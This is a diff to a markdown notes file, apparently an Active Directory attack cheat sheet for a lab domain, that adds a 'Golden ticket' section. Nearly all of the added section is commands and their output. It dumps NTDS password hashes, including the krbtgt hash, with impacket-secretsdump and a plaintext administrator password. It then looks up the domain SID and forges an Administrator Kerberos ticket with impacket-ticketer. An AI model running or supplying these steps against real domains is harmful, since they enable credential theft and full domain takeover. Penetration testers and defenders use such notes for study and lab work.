@@ -90,3 +90,38 @@ sudo ntpdate 192.168.68.64 && sudo impacket-ticketer -nthash fd72ca83b31d63f8644
 # Default principal: Administrator@CONTOSO.ORG
 ```
 
+## Golden ticket
+```bash
+impacket-secretsdump -outputfile secretsdump.txt 'contoso.org'/'Administrator':'win2016-cli-P@$swd1!'@'192.168.68.64'
+
+cat secretsdump.txt.ntds
+# Administrator:500:aad3b435b51404eeaad3b435b51404ee:c70399550b62d5f52c84b2a2fad7b41a:::
+# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:60fcae2d99c85fb300602b91223f9516:::
+# ...
+
+impacket-lookupsid contoso.org/Administrator@192.168.68.64
+# Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+#
+# Password:
+# [*] Brute forcing SIDs at 192.168.68.64
+# [*] StringBinding ncacn_np:192.168.68.64[\pipe\lsarpc]
+# [*] Domain SID is: S-1-5-21-245103785-2483314120-3684157271
+# ...
+
+sudo impacket-ticketer -nthash '60fcae2d99c85fb300602b91223f9516' -domain-sid 'S-1-5-21-245103785-2483314120-3684157271' -domain 'contoso.org' 'Administrator'
+# Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+#
+# [*] Creating basic skeleton ticket and PAC Infos
+# [*] Customizing ticket for contoso.org/Administrator
+# [*]   PAC_LOGON_INFO
+# [*]   PAC_CLIENT_INFO_TYPE
+# [*]   EncTicketPart
+# [*]   EncAsRepPart
+# [*] Signing/Encrypting final ticket
+# [*]   PAC_SERVER_CHECKSUM
+# [*]   PAC_PRIVSVR_CHECKSUM
+# [*]   EncTicketPart
+# [*]   EncASRepPart
+# [*] Saving ticket in Administrator.ccache
+```
